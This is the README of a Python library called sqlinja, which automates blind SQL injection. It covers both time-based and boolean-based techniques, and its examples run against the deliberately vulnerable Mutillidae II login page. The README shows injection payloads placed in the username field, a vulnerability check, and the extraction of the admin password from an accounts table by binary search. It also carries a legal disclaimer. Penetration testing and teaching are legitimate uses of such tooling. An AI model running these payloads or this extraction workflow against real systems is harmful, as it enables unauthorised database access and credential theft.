# sqlinja
SqlInja is a Python library designed to automate exploitation of SQL blind injection (time-based or boolean-based). It includes functions for generating payloads, sending requests, and analyzing responses.

The extraction use [Binary search algorithm](https://en.wikipedia.org/wiki/Binary_search_algorithm) for define which candidate is the good value.

## Usages
(the examples are for Login of [mutillidae II](https://github.com/webpwnized/mutillidae) )

### Define the function who execute the requests

This fuction must match to `(request: str) -> bool`.

This function include then target specific logic (encodage, token, method, ...)

##### Time Based Injection 

```python
sleep_duration = 1

def exec_request(request: str, sleep_duration:int) -> bool:
    url = "http://meta.local/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' AND {request} #",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers)
    return res.elapsed.seconds >= sleep_duration
```
##### Boolean Based Injection

```python
def exec_request(payload: str, sleep_duration:int) -> bool:
    url = "http://meta.local/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' OR {payload} # ",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers, allow_redirects=False)
    return res.status_code == 302
```

### Check if target is vulnerable for payload

```python
helper = SqlInja(MySqlConfig(), exec_request, MySqlConfig.payload_int_time)
# Is target vulnerable ?
if(helper.check("SELECT 1")):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")
    exit()
```

### Extract Data from a cell 
```python
# extract pass
# the expected values are ASCII alphanum
candidates = SqlInja.string_to_candidates(string.ascii_letters + string.digits)
helper.prepare_new(candidates, template=MySqlConfig.payload_str_time)
result = helper.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
print("pass for 'admin' : ", "".join(map(chr, result)))
```

More examples in 'example' folder

## Contributing

Contributions are welcome! If you find a bug or have a feature request, please create an issue or submit a pull request.

## Legal disclaimer

Use of this script for attacking a target without mutual consent is illegal. It's is the end user responsibility to obey all applicables laws for his location Developers assume no lisibility and are not responsible for any misuse or domage caused by this program
